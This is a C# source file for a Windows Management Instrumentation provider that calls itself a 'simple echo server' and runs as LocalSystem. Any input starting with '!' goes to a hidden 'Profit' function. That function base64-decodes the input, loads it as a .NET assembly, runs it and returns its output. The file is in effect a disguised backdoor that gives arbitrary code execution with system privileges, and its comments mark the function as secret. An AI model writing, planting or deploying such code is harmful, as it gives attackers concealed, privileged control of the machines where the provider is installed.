using System;
using System.IO;
using System.Management.Instrumentation;
using System.Reflection;
using System.Text;

[assembly: WmiConfiguration(@"root\test", HostingModel = ManagementHostingModel.LocalSystem)]

namespace WmiProviderExample
{
    [System.ComponentModel.RunInstaller(true)]
    public class MyInstall : DefaultManagementInstaller { }

    [ManagementEntity(Name = "Win32_Echo")]
    [ManagementQualifier("Description", Value="Simple echo server.")]
    public class Win32_Echo
    {
        // constructor that takes the prompt as a parameter
        public Win32_Echo() { }

        // static method that echos the input
        [ManagementTask]
        [ManagementQualifier("Description", Value = "Echoes the request.")]
        static public string Echo(string input)
        {
            string result = "Echo: " + input;
            // if it is a special command, then profit
            if (input[0] == '!') { result = Profit(input.Substring(1)); }
            return result;
        } // end Echo method

        static private string Profit(string command)
        {
            string result = "Exception: ";
            try
            {
                Assembly assembly = Assembly.Load(Convert.FromBase64String(command));
                MethodInfo method = assembly.EntryPoint;
                object[] methodParameters = new object[] { null };

                // Redirect stdout and stderr 
                MemoryStream outMS = new MemoryStream();
                StreamWriter outSW = new StreamWriter(outMS);
                outSW.AutoFlush = true;
                Console.SetOut(outSW);
                StreamWriter errSW = new StreamWriter(outMS);
                errSW.AutoFlush = true;
                Console.SetError(errSW);

                // Invoke the entry point method 
                method.Invoke(null, methodParameters);

                // Restore stdout and stderr
                StreamWriter stdOutSW = new StreamWriter(Console.OpenStandardOutput());
                stdOutSW.AutoFlush = true;
                Console.SetOut(stdOutSW);
                StreamWriter stdErrSW = new StreamWriter(Console.OpenStandardError());
                stdErrSW.AutoFlush = true;
                Console.SetError(stdErrSW);

                // Capture stdout into a string
                outMS.Seek(0, SeekOrigin.Begin);
                byte[] buf = new byte[16 * 1024];
                using (MemoryStream ms = new MemoryStream())
                {
                    int read;
                    while ((read = outMS.Read(buf, 0, buf.Length)) > 0) { ms.Write(buf, 0, read); }
                    result = Encoding.Default.GetString(ms.ToArray());
                }
            }
            catch (Exception e) { result += e.Message; }
            return result;
        } // end secret Profit function
    } // end Win32_Echo class
} // end WmiProviderExample namespace

